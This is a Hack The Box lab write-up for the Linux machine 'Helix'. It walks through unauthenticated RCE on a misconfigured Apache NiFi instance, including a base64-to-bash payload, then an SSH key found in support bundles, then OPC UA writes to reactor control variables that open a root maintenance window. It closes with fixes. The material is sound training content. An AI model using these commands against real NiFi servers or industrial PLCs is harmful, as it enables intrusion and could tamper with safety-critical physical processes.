## Summary

Helix is a Medium Linux machine themed around an industrial automation company.
A vhost exposes an **Apache NiFi 1.21.0** instance configured with **anonymous
access and the `execute-code` permission**, allowing unauthenticated remote code
execution as the `nifi` service user. Because the host has no route back to the
attacker (no egress), command output is captured through NiFi's own internal
flowfile queue instead of a reverse shell. Enumeration reveals an **operator SSH
private key** left in NiFi's support bundles, granting access as `operator`.
Privilege escalation abuses an **OT (Operational Technology)** chain: `operator`
can `sudo` a maintenance console that only yields a root shell while a
"maintenance window" is open. That window is opened by a root safety controller
when it detects a hazardous *test* condition — which is forced by writing to the
reactor's **OPC UA** server, escalating to **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Helix | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH (22) and nginx (80) redirecting to `helix.htb`.
2. Vhost fuzzing discovers `flow.helix.htb` hosting Apache NiFi 1.21.0.
3. NiFi allows anonymous access with `execute-code` → unauthenticated RCE as `nifi`.
4. Command output is exfiltrated through NiFi's internal flowfile queue (no egress).
5. An operator SSH private key is found in NiFi's support bundles.
6. SSH access is obtained as `operator` and the user flag is captured.
7. `operator` can `sudo helix-maint-console`, but only with an open maintenance window.
8. The window is opened by the root safety controller on a hazardous test condition.
9. The OPC UA PLC is manipulated to force that condition and open the window.
10. `helix-maint-console` spawns a root shell during the window — root flag captured.

## Reconnaissance

Initial enumeration with **Nmap** showed only two open ports.

```bash
nmap -p- --min-rate 2000 -T4 10.129.14.245
nmap -sC -sV -p22,80 10.129.14.245
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
```

Port 80 redirects to `http://helix.htb/`, indicating virtual host routing. After
adding `helix.htb` to `/etc/hosts`, **vhost fuzzing** revealed a second host:

```bash
ffuf -u http://10.129.14.245/ -H 'Host: FUZZ.helix.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
# flow                    [Status: 200]
```

`flow.helix.htb` serves **Apache NiFi**.

## Foothold — Unauthenticated Apache NiFi RCE

NiFi's REST API exposes the version and, critically, the authentication model:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about
# {"about":{"title":"NiFi","version":"1.21.0", ... }}

curl -s http://flow.helix.htb/nifi-api/access/config
# {"config":{"supportsLogin":false}}

curl -s http://flow.helix.htb/nifi-api/flow/current-user
```

The anonymous user holds full permissions, including the restricted
`execute-code` and `write-filesystem` rights:

```json
{
  "identity": "anonymous",
  "anonymous": true,
  "componentRestrictionPermissions": [
    {"requiredPermission": {"id": "execute-code"}, "permissions": {"canRead": true, "canWrite": true}},
    {"requiredPermission": {"id": "write-filesystem"}, "permissions": {"canRead": true, "canWrite": true}}
  ]
}
```

This is a misconfiguration, not a CVE: anyone can create and run arbitrary
processors. The exploitation flow via the REST API:

1. Create an `org.apache.nifi.processors.standard.ExecuteProcess` processor.
2. Configure `Command=/bin/bash` plus the payload arguments.
3. Connect the `success` relationship to a funnel.
4. Start the processor, wait, then stop it.
5. Read the resulting flowfile from the queue
   (`flowfile-queues/{id}/listing-requests` → `/flowfiles/{uuid}/content`).

That last step is key: the target has a **single interface and no route to the
VPN**, so reverse shells and HTTP exfiltration just hang. Capturing stdout from
NiFi's internal queue needs **no egress at all**.

Two NiFi 1.21 quirks mattered:

- `ExecuteProcess` splits arguments on **space** by default — the `Argument
  Delimiter` property must be set to `;` to pass a full `bash -c` command.
- Linux enforces a **128 KB limit per argument** (`MAX_ARG_STRLEN`), so large
  payloads must be chunked.

The payload was base64-encoded to survive the delimiter:

```
Command:            /bin/bash
Argument Delimiter: ;
Command Arguments:  -c;echo <BASE64_PAYLOAD>|base64 -d|bash
```

RCE confirmed:

```
uid=998(nifi) gid=998(nifi) groups=998(nifi)
Linux helix 5.15.0-164-generic x86_64 GNU/Linux
```

## Enumeration as `nifi`

The host runs an OT stack on localhost only:

```
127.0.0.1:8081   helix-hmi      (www-data, Flask reactor HMI)
127.0.0.1:4840   helix-plc      (plc, OPC UA server)
                 helix-safety   (root, safety controller)
```

A `DBCPConnectionPool` in the NiFi flow stored an encrypted password for DB user
`operator`, and the `nifi.sensitive.props.key` sat in cleartext in
`nifi.properties`. Decrypting it with NiFi's own libraries yielded
`R7qZ9L3xKM2W8pFYcA` — but this is only the H2 database password and **does not
work** for the system `operator`. A realistic decoy.

The real pivot was a credential hunt:

```bash
grep -rniE 'BEGIN OPENSSH' /opt 2>/dev/null
# /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak: -----BEGIN OPENSSH PRIVATE KEY-----
```

An **operator SSH private key** (`-rw-r----- nifi nifi`, comment `root@management`)
was left in NiFi's support bundles, readable by `nifi`.

## Initial Access (User)

```bash
chmod 600 operator_key
ssh -i operator_key operator@10.129.14.245
# uid=1001(operator) gid=1001(operator) groups=1001(operator)
```

The user flag lives at `/home/operator/user.txt`.

## Privilege Escalation via OPC UA and the Maintenance Window

`sudo -l` reveals the root vector:

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

`helix-maint-console` only grants a root shell while a maintenance window is open:

```bash
FLAG="/opt/helix/state/maintenance_window"
window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG")"; now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] && [ "$now" -lt "$until_ts" ]
}
if ! window_ok; then echo "Maintenance window CLOSED."; exit 1; fi
# ... spawns an interactive root shell:
systemd-run --quiet --scope --unit="helix-maint-$$" /bin/bash -p -i
```

The window file is written by the root `helix-safety` controller. The HMI
(`http://127.0.0.1:8081`) explains the rule:

> *"This window is granted by the safety controller only when a hazardous test
> condition is detected (e.g., Temp ≥ 295 °C or Pressure ≥ 73 bar) while still
> below trip."*

So the reactor must be pushed into a hazardous **test** condition through the
**OPC UA** server.

### Mapping the OPC UA server

The PLC's OPC UA server (`opc.tcp://127.0.0.1:4840/helix/`, FreeOpcUa) is
localhost-only. With no OPC UA library and no internet on the box, the
pure-Python **`asyncua`** client was transferred in base64 chunks through the
NiFi RCE channel and imported via `zipimport`. The address space exposed the
writable reactor nodes:

```
Plant.Reactor.CalibrationOffset  [ns=2;i=6]   Double   (Temp = TemperatureRaw + offset)
Plant.Control.Mode               [ns=2;i=12]  String
Plant.Control.TestOverride       [ns=2;i=13]  Boolean
Plant.Safety.RodsInserted        [ns=2;i=8]   Boolean
```

### Finding the right condition

The HMI computes an internal `Test Mode Active` flag that decides whether the
controller treats a hazard as a *test* (opens the window) or a *real emergency*
(inserts the control rods). Probing the values empirically revealed:

```
Test Mode Active = YES   <=>   Mode == "MAINTENANCE"  AND  TestOverride == True
```

Earlier attempts with `Mode == "TEST"` made the controller treat the temperature
spike as a real emergency and keep the window shut. The winning sequence written
over OPC UA:

```python
Mode              <- "MAINTENANCE"
TestOverride      <- True
CalibrationOffset <- 12.0    # ~284 + 12 = ~296 °C  (>= 295, below trip)
```

Seconds later, `helix-safety` (root) creates the window file and the HMI reports
`Privileged Maintenance Window — Status: OPEN (~119s)`.

### Getting root

With the window open (~120 s lifetime), the console is run over a PTY, feeding
commands to the resulting root shell:

```bash
printf 'cat /root/root.txt\nexit\n' | \
  ssh -tt -i operator_key operator@10.129.14.245 \
  'sudo /usr/local/sbin/helix-maint-console'
```

```
[+] Privileged maintenance access granted
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**Apache NiFi anonymous access with `execute-code`** — the instance had no login
and granted the anonymous identity full, restricted permissions, yielding
unauthenticated RCE. Fix: enable authentication, never grant policies to the
anonymous identity, and lock down restricted components.

**Recoverable sensitive credential** — the flow password was encrypted but the
`sensitive.props.key` was cleartext in a readable config, making any flow secret
trivially decryptable. Fix: protect the key (Vault/HSM) and restrict config
permissions.

**Exposed SSH private key** — an operator key left in a diagnostic support bundle
turned low-priv RCE into a real user session. Fix: never store private keys in
application or bundle directories; audit and rotate.

**Insecure OT access control (OPC UA)** — the PLC allowed anonymous writes to
safety-critical reactor variables, letting an attacker fake a hazardous test
state and trick a root service into opening a privileged window. Fix: require
authentication and security policies on OPC UA, validate inputs, and never tie
IT privilege decisions to manipulable process signals.

**Privilege path gated by manipulable state** — the `sudo` root shell depended on
a state file whose creation could be triggered by untrusted OPC UA input. Fix:
minimize NOPASSWD sudo, avoid interactive root shells from maintenance scripts,
and never gate privilege on low-priv-influenced state.

## Tools Used

- **Nmap** — port scanning and service fingerprinting
- **FFUF** — virtual host fuzzing
- **cURL / NiFi REST API** — processor creation and flowfile-queue output capture
- **Java (NiFi PropertyEncryptor)** — decrypting the flow's sensitive password
- **asyncua** — OPC UA client to read and write PLC nodes
- **SSH** — operator access and PTY session for the maintenance console

## Key Takeaways

1. The interesting service hid behind a vhost — always fuzz virtual hosts.
2. Misconfiguration beats CVE: anonymous NiFi with `execute-code` was a full RCE.
3. With no egress, exfiltrate through the channel you already have (NiFi's queue).
4. Diagnostic bundles leak secrets — an SSH key there was the real pivot.
5. OT is attack surface: IT privilege should never hinge on manipulable process signals.
